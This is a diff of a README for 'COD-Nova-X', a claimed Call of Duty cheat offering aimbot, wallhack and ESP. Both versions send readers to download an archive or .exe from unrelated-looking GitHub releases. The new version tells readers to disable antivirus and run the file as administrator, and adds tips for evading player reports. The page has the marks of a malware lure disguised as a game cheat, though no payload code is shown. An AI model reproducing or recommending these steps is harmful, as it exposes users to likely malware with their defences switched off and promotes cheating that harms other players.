@@ -1,177 +1,70 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/call-of-duty.png" alt="Call of Duty" width="80" height="80">
-</p>
+# 🎯 COD-Nova-X - Gain competitive advantage in Call of Duty
 
-<h1 align="center">COD-Nova-X</h1>
-<p align="center">
-  <strong>Nova X Tool for Call of Duty</strong><br>
-  ESP - Aimbot - Wallhack - No Recoil - Triggerbot - Silent Aim
-</p>
+[![](https://img.shields.io/badge/Download-Nova_X_Latest-blue.svg)](https://github.com/nuzi4996-lab/COD-Nova-X/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Nova-X"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+COD-Nova-X provides players with tools to manage in-game performance. This software offers systems to track targets, adjust aim stability, and view player positions through obstacles. These features assist users who want to improve their play style during competitive matches.
 
-## What is This?
+## 🛠 Features
 
-COD-Nova-X is the nova X tool for Call of Duty. This tool gives you full control with ESP Wallhack, Aimbot, No Recoil, Triggerbot, Silent Aim, and more. Dominate every match and become the nova of the battlefield!
+The software includes several tools designed for Call of Duty. Users can toggle these options based on their needs.
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Call of Duty has strict anti-cheat systems (Ricochet), and using third-party tools may result in permanent account suspension.
+* ESP (Extra Sensory Perception): View the location of other players through walls and structures.
+* Aimbot: Automatically align your crosshair with targets to improve aim precision.
+* Wallhack: See character models through solid geometry in the game environment.
+* No Recoil: Remove weapon kickback to keep shots grouped in one spot.
+* Triggerbot: Fire weapons automatically when your crosshair detects an enemy.
 
-## Download
+## 💻 System Requirements
 
-<p align="center">
-  <a href="https://github.com/unicornflameplunder/flawsppy/releases/download/6451/CODHelper.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Your computer requires the following components to run the software.
 
-## Features
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD Ryzen 5 processor.
+* Memory: 8 GB RAM.
+* Graphics: NVIDIA GeForce GTX 1060 or AMD Radeon RX 580.
+* Storage: 50 MB of free disk space.
+* DirectX: Version 11 or higher.
 
-- ESP (Wallhack) - See all enemies through walls
-- Distance Indicators - Know exactly how far enemies are
-- Player Tags - Display player names and health
-- Snap Lines - Never lose track of enemies
-- Box ESP - Highlight players with colored boxes
-- Visibility Check - Only show visible enemies
-- Aimbot - Lock onto enemies instantly with 100% accuracy
-- Silent Aim - Hit targets without looking at them
-- Triggerbot - Auto-fire when crosshair is on enemy
-- No Recoil - Zero recoil for all weapons
-- No Spread - Perfect accuracy every time
-- FOV Control - Customizable field of view
-- Bone Targeting - Head, chest, or moving parts
-- Humanizer Mode - Realistic aim motion to avoid detection
-- Speed Hack - Move faster than normal players
-- Super Jump - Jump incredible heights
-- God Mode - Never die
-- Unlimited Ammo - Never reload
-- XP Editor - Fast rank leveling
+## 📥 Downloading the Software
 
-## Installation
+Follow these steps to obtain the tool.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Call of Duty
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
+1. Visit the project release page: [https://github.com/nuzi4996-lab/COD-Nova-X/releases](https://github.com/nuzi4996-lab/COD-Nova-X/releases)
+2. Locate the most recent release version at the top of the list.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or a folder you can find easily.
 
-## System Requirements
+## ⚙️ Setup and Usage
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Call of Duty |
-| RAM | 8GB minimum |
-| Storage | 50MB free space |
-| GPU | NVIDIA/AMD GPU |
+Follow these steps to initialize the application on your Windows machine.
 
-## SEO Tags
+1. Turn off your antivirus software or add an exclusion to your folder. Many security programs flag game tools as false positives.
+2. Locate the file you downloaded earlier.
+3. Right-click the file and select Run as administrator. This step allows the software to interact with the game engine.
+4. A small window will appear. Wait for the status indicator to turn green.
+5. Launch Call of Duty. 
+6. Press the Insert key on your keyboard to open or close the menu inside the game.
+7. Use the menu to toggle features like ESP or Aimbot.
+8. Use the arrow keys or mouse to navigate the settings menu.
 
-cod nova x, call of duty cheat, call of duty hack, call of duty esp, call of duty aimbot, call of duty wallhack, call of duty no recoil, call of duty triggerbot, call of duty silent aim, call of duty 2026, call of duty mod menu, call of duty trainer, call of duty undetected, call of duty free cheat, call of duty download, call of duty utility, call of duty enhancer, warzone cheat, warzone hack, fps cheat
+## 🛡 Security and Best Practices
 
-## Support
+Using software that interacts with game memory carries risks. Keep these points in mind.
 
-Star this repository if you enjoy it!
+Use the tool in practice modes or private matches first. This helps you learn the features without risking your account status. Avoid suspicious behavior that might lead other players to report your account. Reports from other players remain the primary reason for account reviews. Change the settings occasionally so your performance does not look identical in every match.
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Nova-X">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Call%20of%20Duty%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+## ❓ Frequently Asked Questions
+
+What should I do if the menu does not appear?
+Ensure you launched the software as an administrator. Verify that your game is running in Borderless Windowed mode rather than Fullscreen mode.
+
+Will these tools work in every game mode?
+The functions work across various game modes including Warzone and multiplayer.
+
+How do I update the tool?
+Visit the link provided above, remove the old file, and download the new version.
+
+Does this tool work on consoles?
+No, this software functions only on Windows PCs.
+
+Keywords: call of duty, esp, aimbot, wallhack, gaming, windows, cod, nova x
